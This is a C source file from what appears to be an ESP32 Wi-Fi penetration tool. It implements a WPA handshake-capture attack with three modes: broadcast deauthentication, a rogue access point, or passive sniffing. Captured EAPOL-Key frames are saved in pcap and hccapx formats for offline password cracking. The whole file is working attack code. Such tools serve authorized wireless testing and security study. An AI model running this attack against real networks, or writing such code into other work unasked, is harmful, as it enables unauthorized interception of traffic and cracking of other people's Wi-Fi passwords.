/**
 * @file attack_handshake.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-03
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements handshake attacks and different available methods.
 */

#include "attack_handshake.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi_types.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"

static const char *TAG = "main:attack_handshake";
static attack_handshake_methods_t method = -1;
static const wifi_ap_record_t *ap_record = NULL;
static bool active;

/**
 * @brief Callback for DATA_FRAME_EVENT_EAPOLKEY_FRAME event.
 * 
 * If EAPOL-Key frame is captured and DATA_FRAME_EVENT_EAPOLKEY_FRAME event is received from event pool, this method
 * appends the frame to status content and serialize them into pcap and hccapx format.
 * 
 * @param args not used
 * @param event_base expects FRAME_ANALYZER_EVENTS
 * @param event_id expects DATA_FRAME_EVENT_EAPOLKEY_FRAME
 * @param event_data expects wifi_promiscuous_pkt_t
 */
static void eapolkey_frame_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGI(TAG, "Got EAPoL-Key frame");
    ESP_LOGD(TAG, "Processing handshake frame...");
    sniffer_frame_t *event = event_data;
    if (!active || event->generation != wifictl_sniffer_generation()) return;
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *)event->packet;
    if (frame->rx_ctrl.sig_len < 4) return;
    attack_lock();
    attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
    pcap_serializer_append_frame(frame->payload, frame->rx_ctrl.sig_len, frame->rx_ctrl.timestamp);
    hccapx_serializer_add_frame((data_frame_t *)frame->payload, frame->rx_ctrl.sig_len - 4);
    attack_unlock();
}

void attack_handshake_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Starting handshake attack...");
    method = attack_config->method;
    ap_record = attack_config->ap_record;
    attack_lock();
    if (!pcap_serializer_init()) {
        attack_unlock();
        attack_note_setup_failure(ESP_ERR_NO_MEM, "pcap_init");
        attack_update_status(TIMEOUT);
        return;
    }
    const attack_job_t *job = attack_get_job();
    hccapx_serializer_init(job->ssid, job->ssid_len);
    attack_unlock();
    active = true;
    const char *stage = "event_handler";
    esp_err_t err = esp_event_handler_register(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler, NULL);
    if (err != ESP_OK) goto failed;
    frame_analyzer_capture_start(SEARCH_HANDSHAKE, ap_record->bssid);
    stage = "sniffer_filter";
    err = wifictl_sniffer_filter_frame_types(true, false, false);
    if (err == ESP_OK) { stage = "sniffer_start"; err = wifictl_sniffer_start(ap_record->primary); }
    if (err != ESP_OK) goto failed;
    switch(attack_config->method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            stage = "broadcast_start";
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_BROADCAST");
            err = attack_method_broadcast(ap_record, 5);
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            stage = "rogue_ap_start";
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_ROGUE_AP");
            err = attack_method_rogueap(ap_record);
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            ESP_LOGD(TAG, "ATTACK_HANDSHAKE_METHOD_PASSIVE");
            // No actions required. Passive handshake capture
            break;
        default:
            ESP_LOGD(TAG, "Method unknown! Fallback to ATTACK_HANDSHAKE_METHOD_PASSIVE");
    }
    if (err == ESP_OK) return;
failed:
    attack_note_setup_failure(err, stage);
    ESP_LOGE(TAG, "Capture start failed at %s: %s", stage, esp_err_to_name(err));
    attack_handshake_stop();
    attack_update_status(TIMEOUT);
}

void attack_handshake_stop(){
    if (!active) return;
    active = false;
    switch(method){
        case ATTACK_HANDSHAKE_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_HANDSHAKE_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_HANDSHAKE_METHOD_PASSIVE:
            // No actions required.
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
    }
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    esp_event_handler_unregister(FRAME_ANALYZER_EVENTS, DATA_FRAME_EVENT_EAPOLKEY_FRAME, &eapolkey_frame_handler);
    ap_record = NULL;
    method = -1;
    ESP_LOGD(TAG, "Handshake attack stopped");
}
